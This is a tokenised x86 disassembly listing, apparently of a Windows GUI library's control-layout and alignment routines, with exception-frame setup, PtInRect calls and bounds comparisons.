mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx esp
mov eax [ ebp + 0x8 ]
call sub_406c90
mov eax esp
call sub_412f54
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_442094
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x1c ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x1c ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe6
call sub_403540
xor eax eax
mov al [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd6
call sub_403540
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax edi
call sub_4420c0
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_412f54
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x24 ]
xor edx edx
xor eax eax
call sub_412edc
lea edx [ esp + 0x24 ]
mov ecx esp
mov eax edi
call sub_442068
sub_444a3c
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
sub_444a7c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_441294
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_444ab0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_444ba8
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_441650
push ebx
push sub_446540
call sub_41ae40
mov [ ebx + 0x18c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d818
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_41d9c8
mov [ ebx + 0x1a9 ] 0x1
mov [ ebx + 0x1a0 ] 0xffffffff
mov [ ebx + 0x184 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_403668
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4610b4
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x188 ]
call sub_4040e8
lea eax [ ebx + 0x188 ]
call sub_404094
jmp r-xdata
mov [ ebx + 0x1a7 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x162 ] al
mov [ ebx + 0x163 ] 0x2
mov [ ebx + 0x164 ] 0x1
mov [ ebx + 0x168 ] 0x1
mov [ ebx + 0x150 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444baf
lea eax [ ebp - 0x8 ]
call sub_404094
retn
sub_444baf
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_444bd4
push ebx
push esi
push edi
call sub_4036d0
mov ebx edx
mov edi eax
mov eax edi
call sub_41a050
cmp [ edi + 0x1a8 ] 0x0
je r-xdata
lea eax [ edi + 0x17c ]
call sub_4057e0
mov eax [ edi + 0x178 ]
call sub_403344
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov [ edi + 0x1a8 ] 0x0
xor edx edx
mov eax edi
call sub_4401fc
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
call sub_445874
mov eax edi
call sub_445ab4
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ edi + 0x170 ]
call sub_403344
mov eax [ edi + 0x18c ]
test eax eax
je r-xdata
mov edx eax
dec edx
mov eax edi
call sub_445a78
mov esi eax
mov edx esi
mov eax edi
call sub_4458e0
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax edi
call sub_445ab4
test eax eax
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_441728
test bl bl
jle r-xdata
call sub_41aed8
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4036b8
sub_444ca4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_444d68
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_41455c
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403344
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_448f44
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_4143bc
mov edx [ eax + 0x1a0 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_4144b0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4143bc
test eax eax
je r-xdata
sub_444d78
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44561c
xor eax eax
push ebp
push sub_444db8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44198c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444dbf
mov eax [ ebp - 0x4 ]
call sub_445624
retn
sub_444dbf
mov eax [ ebp - 0x4 ]
call sub_444ca4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_446478
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_443750
sub_444df4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
xor ebx ebx
mov bl [ ebp - 0x1 ]
cmp ebx 0x6
ja r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
jmp [ ebx * 4 + jump_table_444e0f ]
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setle cl
jmp r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setle cl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0xa4 ]
mov ecx eax
sub_444e80
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x61 ]
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_449088
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov al [ ebp - 0x5 ]
add al 0xfd
sub al 0x2
jb r-xdata
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_412edc
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x5 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_445201
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445208
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
jmp [ eax * 4 + jump_table_445116 ]
sub al 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
push eax
call sub_4062e4
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
sub [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xa8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x6
ja r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_445079
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
push eax
call sub_4062e4
mov edx [ ebp - 0x18 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x18 ] edx
jmp r-xdata
sub eax edx
mov [ ebp - 0x10 ] eax
adc edx 0x0
sub_445208
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor edx edx
mov dl [ ebp - 0x5 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
cmp edx [ ebp - 0x18 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_445237 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
sub_4452c0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_445ab4
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_414210
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4143bc
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_444e80
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_445a78
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
xor esi esi
jmp r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_414438
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_4143bc
mov edx eax
mov ecx ebx
mov eax edi
call sub_444df4
pop ecx
test al al
je r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
inc esi
sub_445430
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_445ab4
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_445a78
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_445a78
mov dl [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_445484
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
push ebp
call sub_445430
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_445563
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_4452c0
pop ecx
push ebp
mov al 0x2
call sub_4452c0
pop ecx
push ebp
mov al 0x3
call sub_4452c0
pop ecx
push ebp
mov al 0x4
call sub_4452c0
pop ecx
push ebp
mov al 0x5
call sub_4452c0
pop ecx
push ebp
mov al 0x6
call sub_4452c0
pop ecx
push ebp
xor eax eax
call sub_4452c0
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc7
call sub_403540
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403344
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_403540
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_445588
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_449088
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x160 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44561c
xor eax eax
push ebp
push sub_44560f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_445624
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_44564c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_445711
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_441f54
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_445ab4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445718
mov eax [ ebp - 0xc ]
call sub_403344
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_445a78
mov edx eax
mov eax [ ebp - 0xc ]
call sub_414210
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_441cc0
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4143bc
xor ecx ecx
mov edx 0xb03e
call sub_443750
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_445a78
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_445720
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_445ab4
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_44561c
xor edx edx
push ebp
push sub_445807
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_445ab4
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc0
call sub_403540
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
test ebx ebx
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_445a78
mov edx eax
mov eax [ ebp - 0xc ]
call sub_414210
mov edx ebx
dec edx
mov eax [ ebp - 0xc ]
call sub_4143bc
cmp [ eax + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_403344
mov eax [ ebp - 0x4 ]
call sub_445624
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_445a78
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
call sub_441a64
mov dl 0x4
call sub_441a64
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_41425c
sub_445874
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_45a2f0
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_45e10c
sub_445894
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_440e44
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_440e44
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_440e44
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_4458e0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_440e6c
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_440e6c
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_440e6c
jmp r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_445928
push ebx
push esi
push edi
mov ebx edx
